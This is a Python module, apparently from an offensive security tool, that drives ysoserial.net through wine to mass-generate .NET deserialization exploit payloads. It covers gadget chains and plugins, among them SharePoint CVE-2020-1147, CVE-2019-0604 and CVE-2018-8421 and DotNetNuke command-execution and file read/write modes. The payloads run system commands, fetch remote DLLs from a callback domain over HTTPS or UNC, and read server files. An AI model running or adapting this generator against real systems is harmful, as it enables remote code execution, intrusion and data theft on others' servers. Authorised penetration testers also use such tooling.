import re
import logging
import urllib.parse
import os
import json
from .serializer import Serializer

class YSOSerialNet(Serializer):

    usage = 'ysoserial.net'

    cacheFile = '.ysoserial.net.chains.cache'

    specialPayloadFormats = {
        ## GADGETS ##
        #'ActivitySurrogateDisableTypeCheck': 'Unhandled Exception: System.Runtime.Serialization.SerializationException: Soap Serializer does not support serializing Generic Types : System.Collections.Generic.SortedSet`1[System.String].',
        'ActivitySurrogateSelectorFromFile': ['<local_file>'],
        'BaseActivationFactory': ['<url>'],
        'DataSetOldBehaviourFromFile': ['<local_file>'],
        'GetterCompilerResults': ['<url>'],
        'ObjRef': ['<net_remoting_url>'],
        #'PSObject': 'Unhandled Exception: System.IO.FileNotFoundException: Could not load file or assembly System.Management.Automation, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35 or one of its dependencies. File not found ',
        'XamlAssemblyLoadFromFile': ['<local_file>'],

        ## PLUGINS ##
        'ApplicationTrust': [
            "-c '<system_command>'"
        ],
        'DotNetNuke': [
            "-m read_file -f '<remote_file_to_read>'", 
            "-m write_file -u <url> -f '<remote_file_to_write>'", 
            "-m run_command -c '<system_command>'"
        ],
        'NetNonRceGadgets': [
            "-g '<gadget>' -i '<url>'"
        ],
        'QueryPartitionProvider': [
            "-g '<gadget>' -i '<local_gadget_file>'"
        ],
        'SessionSecurityTokenHandler': [
            "-c '<system_command>'"
        ],
        'SharePoint': [
            "--cve=CVE-2020-1147 -c '<system_command>'",
            "--cve=CVE-2019-0604 -c '<system_command>'",
            "--cve=CVE-2018-8421 -c '<system_command>'",
            "--cve=CVE-2020-1147 -c '<url>' --useurl",
            "--cve=CVE-2019-0604 -c '<url>' --useurl",
            "--cve=CVE-2018-8421 -c '<url>' --useurl",
        ],
        'ThirdPartyGadgets': [
            "-g '<gadget>' -i '<unc>'",
        ],
        'TransactionManagerReenlist': [
            "-c '<system_command>'"
        ],
        # gadget from ThirdPartyGadgets plugin
        'GetterActiveMQObjectMessage': [
            "-g '<gadget>' -i '<system_command>'",
        ],
        # gadget from ThirdPartyGadgets plugin
        'OptimisticLockedTextFile': [
            "-g '<gadget>' -i '<remote_file_to_read>'",
        ]
    }

    binaryFormattersOrPlugins = [
        'BinaryFormatter', 
        'MessagePackTypeless',
        'MessagePackTypelessLz4',
        'SharpSerializerBinary',
        'TransactionManagerReenlist'
    ]

    def __init__(self, winePath, exePath, chainOpts):
        self.winePath = winePath
        self.exePath = exePath
        self.ysoserialNetOpts = chainOpts.ysoserial_net_options
        if os.name == 'nt':
            bin = f"{exePath}"
        else:
            bin = f"{winePath} {exePath}"
        super().__init__(bin, chainOpts)

    def exists(self):
        if os.name != 'nt':
            logging.debug("Checking wine binary for linux os")
            binBackup = self.bin
            self.bin = self.winePath
            wineOut = self.exec('--version 2>&1')
            self.bin = binBackup
            if not 'wine-' in wineOut:
                logging.error("wine binary not found or error:")
                logging.error(wineOut)
                return False
        
        return super().exists()

    def chains(self):

        if os.path.exists(self.cacheFile) and self.chainOpts.no_cache:
            os.remove(self.cacheFile)

        if os.path.exists(self.cacheFile) and not self.chainOpts.no_cache:
            with open(self.cacheFile, 'r') as f:
                chains = json.load(f)
            return chains

        logging.warning("No chain cache for ysoserial.net. First exec may take some time...")

        # list chains in help
        chains = self.chainsAux('')

        finalChains = []
        for chain in chains:
            pluginChains = []
            if chain['type'] == 'plugin':
                pluginChains = self.chainsAux(f"-p {chain['name']} -l", chain['name'])
                
            if len(pluginChains) > 0:
                finalChains = finalChains + pluginChains
            else:
                finalChains.append(chain)

        with open(self.cacheFile, 'w') as f:
            json.dump(finalChains, f, indent=4)

        return finalChains

    def chainsAux(self, options, parentChain=""):

        chainPrefix = parentChain+"/" if parentChain != '' else ''
        chainsOutput = self.exec(options).split('\n')
        chainPattern = r"^\s+\(\*\)\s(?P<name>[\w]+)"
        formattersPattern = r"^\s+Formatters:\s(?P<formatters>.+)$"
        chainRegex = re.compile(chainPattern)
        formattersRegex = re.compile(formattersPattern)
        
        chains = []
        chainType = 'gadget'
        chain = None
        for line in chainsOutput:
            if '== GADGETS ==' in line:
                chainType = 'gadget'
                continue
            if '== PLUGINS ==' in line or 'Gadgets:' in line:
                chainType = 'plugin'
                continue
            if 'Usage: ysoserial.exe' in line:
                break
            # an empty line stop the current chain parsing anyway
            if line.strip() == '' and chain != None:
                chains.append(chain)
                chain = None
                continue
            
            match = chainRegex.search(line)
            if match:
                if chain != None:
                    chains.append(chain)
                chain = match.groupdict()
                formats = None

                # fixing a type in the help message...
                if chain['name'] == 'PreserverWorkingFolder':
                    chain['name'] = 'PreserveWorkingFolder'

                if chain['name'] in self.specialPayloadFormats:
                    formats = self.specialPayloadFormats[chain['name']]
                elif parentChain in self.specialPayloadFormats:
                    formats = self.specialPayloadFormats[parentChain]
                elif chainType == 'gadget':
                    formats = ['<system_command>']
                # type is plugin, we need a format, or it means, it's not supported yet
                else:
                    chain = None
                    continue

                chain = {
                    'id': (chainPrefix.replace('/','-')+chain['name']).lower(),
                    'name': chainPrefix+chain['name'],
                    'type': chainType,
                    'description': f"{chain['name']}",
                    'formats':  formats,
                    'formatters': ['NoFormatter']
                }

            match = formattersRegex.search(line)
            if match and chain != None:
                formatters = match.groupdict()
                chain['formatters'] = []
                for formatter in formatters['formatters'].split(','):
                    formatter = formatter.strip().split(' ')[0]
                    chain['formatters'].append(formatter)
                chain['description'] = f"{chain['name']}: {' | '.join(chain['formatters'])}"

        return chains
    

    
    def payloadGadget(self, chainName, chainArgs):
        return self.exec(f"{self.ysoserialNetOpts} -g '{chainName}' {chainArgs}", rawResult=True)
    
    def payloadPlugin(self, chainName, chainArgs):
        return self.exec(f"{self.ysoserialNetOpts} -p '{chainName}' {chainArgs}", rawResult=True)

    def generate(self, chains):

        if len(chains) == 0:
            return 0

        system_command = self.chainOpts.system_command
        interact_domain = self.chainOpts.interact_domain
        remote_file_to_read = "C:\\WINDOWS\\System32\\drivers\\etc\\hosts" if self.chainOpts.remote_file_to_read is None else self.chainOpts.remote_file_to_read
        remote_file_to_write = self.chainOpts.remote_file_to_write
        csharp_code = self.getFileContentOrCode(self.chainOpts.csharp_code)
        csharp_code_dlls = self.chainOpts.csharp_code_dlls
        formatters_filters = self.chainOpts.ysoserial_net_formatters.split(',') if self.chainOpts.ysoserial_net_formatters != None else None

        if '%%domain%%' in self.chainOpts.csharp_net_remoting and not interact_domain:
            logging.warning("%%domain%% in csharp .Net remoting URL but no interact domain provided")
            csharp_net_remoting = None
        else:
            csharp_net_remoting = self.chainOpts.csharp_net_remoting.replace('%%domain%%', interact_domain)
        
        logging.info(f"Interact domain: {interact_domain}")
        logging.info(f"System command: {system_command}")
        logging.info(f"File read on server: {remote_file_to_read}")
        logging.info(f"File written on server: {remote_file_to_write}")
        logging.info(f"CSharp Code: {self.chainOpts.csharp_code}")
        logging.info(f".Net remoting URL: {csharp_net_remoting}")
        logging.info(f"Use only formatters: {formatters_filters}")

        # create an empty file that will contain C# code with the payload
        # create it in the current working directory, else wine won't see it
        fp = self.createTemporaryFile(suffix='.cs', dir=os.getcwd())
        if fp == None:
            return 0
        
        # create a file for the first binary payload generated
        binPayloadGenerated = False
        fb = self.createTemporaryFile(suffix='.bin', dir=os.getcwd())
        if fb == None:
            return 0

        logging.info(f"Generating payloads...")
        
        # generate payload for each chain
        count = 0
        for chain in chains:

            for formatter in chain['formatters']:

                for format in chain['formats']:

                    if formatters_filters != None and formatter not in formatters_filters:
                        logging.debug(f"[{chain['name']}] Skipping formatter '{formatter}'")
                        continue

                    if '<url>' in format and not interact_domain:
                        logging.warning(f"[{chain['name']}] Skipping payload with formattter {formatter} because it requires a remote DLL URL")
                        continue
                    if '<net_remoting_url>' in format and not csharp_net_remoting:
                        logging.warning(f"[{chain['name']}] Skipping payload with formattter {formatter} because it requires a .Net Remoting URL")
                        continue
                    if '<unc>' in format and not interact_domain:
                        logging.warning(f"[{chain['name']}] Skipping payload with formattter {formatter} because it requires a UNC DLL path")
                        continue

                    logging.info(f"[{chain['name']}] Generating payload with formatter '{formatter}'")

                    plugin = chain['name'].split('/')[0]
                    gadget = chain['name'].split('/')[1] if len(chain['name'].split('/')) > 1 else chain['name']

                    chain_system_command = system_command
                    chain_system_command = chain_system_command.replace('%%chain_id%%', chain['id'])
                    chain_system_command = chain_system_command.replace('%%domain%%', str(interact_domain))
                    escaped_chain_system_command = chain_system_command.replace('"', '\\"')
                    chain_system_command = chain_system_command.replace("'", "\\'")
                    

                    chain_csharp_code = csharp_code
                    chain_csharp_code = chain_csharp_code.replace('%%system_command%%', escaped_chain_system_command)
                    chain_csharp_code = chain_csharp_code.replace('%%domain%%', str(interact_domain))
                    chain_csharp_code = chain_csharp_code.replace('%%chain_id%%', chain['id'])

                    chainArguments = format
                    chainArguments = chainArguments.replace('<gadget>', gadget)
                    chainArguments = chainArguments.replace('<local_file>', os.path.basename(fp.name)+";"+csharp_code_dlls)
                    chainArguments = chainArguments.replace('<system_command>', chain_system_command)
                    chainArguments = chainArguments.replace('<domain>', str(interact_domain))
                    chainArguments = chainArguments.replace('<url>', f"https://{interact_domain}/{chain['id']}.dll")
                    chainArguments = chainArguments.replace('<unc>', f"\\\\{interact_domain}\\share\\{chain['id']}.dll".replace('\\', '\\\\'))
                    chainArguments = chainArguments.replace('<net_remoting_url>', csharp_net_remoting.replace('%%chain_id%%', chain['id']))
                    chainArguments = chainArguments.replace('<remote_file_to_read>', remote_file_to_read)
                    chainArguments = chainArguments.replace('<remote_file_to_write>', remote_file_to_write.replace('%%ext%%', 'dll'))
                    chainArguments = chainArguments.replace('<local_gadget_file>', fb.name)

                    with open(fp.name, mode='w') as ft:
                        ft.write(chain_csharp_code)

                    if chain['type'] == 'gadget':
                        chainArguments = f"-f '{formatter}' -c '{chainArguments}' -o raw"
                        result = self.payloadGadget(chain['name'], chainArguments)
                    elif chain['type'] == 'plugin':
                        chainArguments = f"-f '{formatter}' {chainArguments} -o raw"
                        result = self.payloadPlugin(plugin, chainArguments)

                    if result.returncode != 0:
                        logging.error(f"[{chain['name']}] Failed to create payload")
                        if result.stderr != b'':
                            logging.error(result.stderr.decode('ascii'))
                        if result.stdout != b'':
                            logging.error(result.stdout.decode('ascii'))
                        continue

                    payload = result.stdout

                    logging.debug(f"[{chain['name']}] Payload generated with {len(payload)} bytes")
                    
                    # binary formatters or plugin output can be encoded
                    if formatter in self.binaryFormattersOrPlugins or plugin in self.binaryFormattersOrPlugins:
                        if not binPayloadGenerated:
                            logging.debug(f"[{chain['name']}] Writing the first binary payload found for plugin use")
                            with open(fb.name, mode='wb') as ft:
                                ft.write(payload)
                                binPayloadGenerated = True
                    else:
                        # clean string style formatters to have 1 payload per line
                        if not self.chainOpts.one_file_per_payload:
                            payload = payload.decode('ascii').replace('\r', '').replace('\n', '').encode('ascii')

                    payload = self.encode(payload)
                    
                    self.output(f"{chain['id']}_{formatter}", payload+b"\n")
                    count = count + 1
        
        # cleanup temp file
        if os.path.exists(fp.name):
            logging.debug(f"Removing temporary file {fp.name}")
            os.remove(fp.name)
        if os.path.exists(fb.name):
            logging.debug(f"Removing temporary file {fb.name}")
            os.remove(fb.name)
                
        return count
